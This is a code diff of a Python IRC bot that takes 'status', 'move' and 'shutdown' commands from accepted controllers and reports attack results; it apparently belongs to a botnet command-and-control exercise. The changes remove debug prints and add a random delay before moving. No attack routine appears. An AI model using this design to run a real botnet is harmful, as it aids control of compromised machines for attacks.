@@ -70,9 +70,7 @@ class Bot:
             if prefix not in self.acceptedCons:
                 self.acceptedCons.append(prefix)
         if prefix in self.acceptedCons:
-            print("from " + prefix + " to do " + message)
             if message == "status":
-                #print("sending back status")
                 x = random.randint(1,4)
                 y = random.randint(1,5)
                 time.sleep(x/y)
@@ -89,11 +87,13 @@ class Bot:
                     newHost = message.split()[1]
                     newPort = message.split()[2]
                     newChannel = message.split()[3]
+                    x = random.randint(1,4)
+                    y = random.randint(1,5)
+                    time.sleep(x/y)
                     self.botMove(newHost, newPort, newChannel)
                 else:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
             elif message == "shutdown":
-                #print("shutting down")
                 x = random.randint(1,4)
                 y = random.randint(1,5)
                 time.sleep(x/y)
@@ -126,7 +126,6 @@ class Bot:
             print("found exception" + str(e))
             reason = "unknown reason"
             if isinstance(e, socket.gaierror):
-                print("isinstance")
                 reason = "no such hostname"
             msg = ("Attack failed - " + self.botNick + " - " + str(reason))
             print(msg)
@@ -163,9 +162,8 @@ class Bot:
                 self.IRCSOCKET = newSocket 
             except:
                 pass
-            print("asdfadfadsfa")
             for x in self.acceptedCons:
-                self.privateMsg(x, self.botNick + " has moved to " + str(self.HOST) + " " + str(self.PORT) + " " + str(self.CHANNEL))
+                self.privateMsg(x, "Move successful - " + str(self.botNick))
             return True 
         except:
             print("ERROR: Unable to move to new channel\nBot still in old channel")
@@ -188,19 +186,14 @@ class Bot:
         try:
             while True:
                 response = self.getData()
-                #print(response)   
                 if(response != ""):                                         
                         if response.find("PRIVMSG") != -1:                           
                             name = response.split('!',1)[0][1:]
                             message = response.split('PRIVMSG',1)[1].split(':',1)[1]
-                            print("message from " + name + ": " + message)   
                             self.handleResponse(name, message)                               
                         elif response.find("PING") != -1:
                             self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                         
                         elif response.find('433') != -1:
-                            #self.createNick(self.NICK)
-                            #self.connectIRC(self.s,self.NICK, self.chan)  
-                            # Use this to make new nickname if needed
                             self.changeNick()
                             pass
         except Exception as e:
@@ -242,7 +235,7 @@ def main():
             print("{} Trying to reconnect..." .format(e))
             continue
 
-        print("bot set up")
+        print("Bot setting up")
         print("connecting")
         while noConnection:
             noConnection = bot.IRCconnect(CHANNEL)
